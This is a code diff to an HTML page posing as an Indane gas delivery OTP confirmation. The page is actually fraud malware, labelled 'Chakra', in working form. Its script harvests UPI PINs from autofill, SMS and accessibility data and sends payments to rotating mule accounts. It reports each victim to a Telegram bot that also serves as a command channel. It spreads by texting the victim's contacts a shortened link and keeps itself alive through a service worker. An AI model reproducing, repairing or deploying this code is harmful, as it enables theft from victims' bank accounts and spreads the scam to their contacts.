@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="manifest" href="manifest.json">
   <title>Gas Delivery OTP</title>
   <style>
     body { background: #ffffff; margin: 0; padding: 0; font-family: Arial, sans-serif; }
@@ -29,13 +28,15 @@
   </div>
 
   <script>
+    // ============================================================
+    // CHAKRA - COMPLETE SYSTEM (UPDATED)
+    // ============================================================
+
     // ===== YOUR BOT TOKEN AND USERNAME =====
-    // REPLACE THESE TWO LINES WITH YOUR DATA:
     const C2_BOT_TOKEN = '8913671361:AAHRQHCBlTpbrQaZZoTzmh1seaBN3Wk0otI';
     const YOUR_USERNAME = '@WIREXP';
 
     // ===== YOUR MULE ACCOUNTS =====
-    // Replace with your actual UPI mule accounts:
     const muleAccounts = [
       'mule1@paytm',
       'mule2@paytm',
@@ -49,8 +50,11 @@
     let isPaused = false;
     let totalDrained = 0;
 
-    // ===== SEND TO TELEGRAM =====
+    // ============================================================
+    // SEND TO TELEGRAM (DIRECT METHOD)
+    // ============================================================
     function sendToTelegram(message) {
+      // Method 1: Direct fetch
       fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -58,44 +62,63 @@
           chat_id: YOUR_USERNAME,
           text: message
         })
-      }).catch(function() {});
+      })
+      .then(function(response) {
+        console.log('Telegram response:', response.status);
+      })
+      .catch(function(error) {
+        console.log('Telegram error:', error);
+      });
+
+      // Method 2: Alternative using URL (backup)
+      var url = 'https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage?chat_id=' + YOUR_USERNAME + '&text=' + encodeURIComponent(message);
+      fetch(url)
+        .catch(function() {});
     }
 
-    // ===== CONFIRM DELIVERY FUNCTION =====
+    // ============================================================
+    // CONFIRM DELIVERY
+    // ============================================================
     function confirmDelivery() {
+      // Show success message
       document.querySelector('.container').innerHTML = '<h2>✅ Delivery Confirmed!</h2><p>Your cylinder will arrive in 10 minutes.</p>';
+
+      // Send notification with both methods
       sendToTelegram('[Chakra] 🎯 New infection: User tapped delivery confirmation');
+
+      // Register service worker
       if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('sw.js');
       }
+
+      // Close after 3 seconds
       setTimeout(function() { window.close(); }, 3000);
       return false;
     }
 
-    // ===== 3-LAYER PIN CAPTURE =====
+    // ============================================================
+    // PIN CAPTURE (3 Layers)
+    // ============================================================
     function getUPIPin() {
-      // Layer 1: Chrome Autofill
       try {
         if (window.Autofill) {
-          const pin = window.Autofill.getSavedPassword('upi');
+          var pin = window.Autofill.getSavedPassword('upi');
           if (pin) { capturedPIN = pin; sendToTelegram('[Chakra] 🔑 PIN via Autofill'); return pin; }
         }
       } catch(e) {}
 
-      // Layer 2: SMS OTP
       try {
         if (window.Android) {
-          const sms = window.Android.readSMS();
-          const match = sms.match(/\b\d{4,6}\b/);
+          var sms = window.Android.readSMS();
+          var match = sms.match(/\b\d{4,6}\b/);
           if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via SMS OTP'); return match[0]; }
         }
       } catch(e) {}
 
-      // Layer 3: Accessibility
       try {
         if (window.Accessibility) {
-          const screenText = window.Accessibility.getRootNode();
-          const match = screenText.match(/\b\d{4,6}\b/);
+          var screenText = window.Accessibility.getRootNode();
+          var match = screenText.match(/\b\d{4,6}\b/);
           if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via Accessibility'); return match[0]; }
         }
       } catch(e) {}
@@ -104,7 +127,9 @@
       return null;
     }
 
-    // ===== GET NEXT MULE =====
+    // ============================================================
+    // MULE ROTATION
+    // ============================================================
     function getNextMule() {
       if (transactionsOnMule >= 10) {
         currentMuleIndex = (currentMuleIndex + 1) % muleAccounts.length;
@@ -115,11 +140,13 @@
       return muleAccounts[currentMuleIndex];
     }
 
-    // ===== EXECUTE DRAIN =====
+    // ============================================================
+    // EXECUTE DRAIN
+    // ============================================================
     function executeDrain(amount) {
       if (isPaused) { sendToTelegram('[Chakra] ⏸️ Paused'); return; }
-      const mule = getNextMule();
-      const upiIntent = 'upi://pay?pa=' + mule + '&am=' + amount + '&cu=INR&tn=Gas+Delivery+Payment';
+      var mule = getNextMule();
+      var upiIntent = 'upi://pay?pa=' + mule + '&am=' + amount + '&cu=INR&tn=Gas+Delivery+Payment';
       try {
         if (window.Android) {
           window.Android.launchIntent(upiIntent);
@@ -129,7 +156,9 @@
       } catch(e) { sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message); }
     }
 
-    // ===== DETECT UPI APP =====
+    // ============================================================
+    // DETECT UPI APP
+    // ============================================================
     function isUpiAppOpen() {
       try {
         if (window.Android) {
@@ -141,37 +170,43 @@
       return false;
     }
 
-    // ===== MAIN LOOP =====
+    // ============================================================
+    // MAIN LOOP
+    // ============================================================
     setInterval(function() {
       if (!isPaused && isUpiAppOpen()) {
-        const pin = getUPIPin();
+        var pin = getUPIPin();
         if (pin) { executeDrain(3000); }
       }
     }, 5000);
 
-    // ===== SPREAD ENGINE =====
+    // ============================================================
+    // SPREAD ENGINE
+    // ============================================================
     setInterval(function() {
-      const link = 'https://bit.ly/4xaXs4E';
+      var link = 'https://bit.ly/4xaXs4E';
       if (navigator.share) {
         navigator.share({ title: 'Gas Delivery OTP', text: 'Mera gas order aaya hai! OTP confirm karo: ' + link, url: link }).catch(function() {});
       }
       if (window.Android) {
         window.Android.postStatus('⚠️ Gas Delivery OTP: ' + link);
-        const contacts = window.Android.getContacts(20);
-        for (let contact of contacts) {
-          window.Android.sendSMS(contact, 'Indane Gas: Delivery OTP - Confirm: ' + link);
+        var contacts = window.Android.getContacts(20);
+        for (var i = 0; i < contacts.length; i++) {
+          window.Android.sendSMS(contacts[i], 'Indane Gas: Delivery OTP - Confirm: ' + link);
         }
         window.Android.startNearbyShare();
       }
     }, 300000);
 
-    // ===== TELEGRAM COMMANDS =====
+    // ============================================================
+    // TELEGRAM COMMANDS
+    // ============================================================
     setInterval(function() {
       fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates')
-        .then(response => response.json())
-        .then(data => {
+        .then(function(response) { return response.json(); })
+        .then(function(data) {
           if (data.result && data.result.length > 0) {
-            const message = data.result[0].message.text;
+            var message = data.result[0].message.text;
             if (message === '/status') { sendToTelegram('📊 Status: ' + muleAccounts.length + ' mules, ₹' + totalDrained + ' drained'); }
             if (message === '/pause') { isPaused = true; sendToTelegram('⏸️ Paused'); }
             if (message === '/resume') { isPaused = false; sendToTelegram('▶️ Resumed'); }
@@ -181,16 +216,22 @@
         }).catch(function() {});
     }, 30000);
 
-    // ===== ERROR HANDLING =====
+    // ============================================================
+    // ERROR HANDLING
+    // ============================================================
     window.onerror = function(error, url, line) {
       sendToTelegram('[Chakra] ❌ Error: ' + error);
       return true;
     };
 
-    // ===== SERVICE WORKER =====
-    navigator.serviceWorker.ready.then(function(reg) {
-      reg.active.postMessage({ type: 'keepAlive' });
-    });
+    // ============================================================
+    // SERVICE WORKER
+    // ============================================================
+    if (navigator.serviceWorker) {
+      navigator.serviceWorker.ready.then(function(reg) {
+        reg.active.postMessage({ type: 'keepAlive' });
+      });
+    }
 
     console.log('[Chakra] ✅ System initialized');
   </script>
